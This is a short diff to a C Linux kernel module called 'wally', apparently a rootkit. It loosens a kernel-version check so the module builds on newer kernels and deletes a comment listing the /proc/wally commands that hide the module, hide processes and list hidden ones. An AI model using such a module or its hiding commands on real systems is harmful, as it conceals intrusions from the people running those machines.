@@ -37,8 +37,8 @@ static struct proc_dir_entry *WallyProcFileEntry;
 struct __lkm_access_t{ struct module *this_mod; };
 static char *magic_word;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,5,0)
-#error "Unsupported kernel version"
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,4,0)
+#pragma message "!! Warning: Unsupported kernel version !!"
 #endif
 
 #define WALLY_DECLARE_MOD(x)                                            \
@@ -80,31 +80,6 @@ static int open_cb(struct inode *ino, struct file *fptr) {
     return single_open(fptr, proc_dummy_show, NULL);
 }
 
-/*
- * Hide this module:
- *
- *  # echo hide >/proc/wally
- *
- *  Ring buffer display unhide key
- *
- * Unhide this module:
- *
- *  # echo <key> >/proc/wally
- *
- * Hide process:
- *
- *  # echo <pid> >/proc/wally
- *
- * List hidden processes:
- *
- *  # echo list >/proc/wally
- *
- *  # dmesg
- *
- * Unhide processes:
- *
- *  # echo <pid> >/proc/wally
- */
 static ssize_t write_cb(struct file *fptr, const char __user *user,
         size_t size, loff_t *offset) {
     char buf[MAX_PROCFS_SIZE+1];
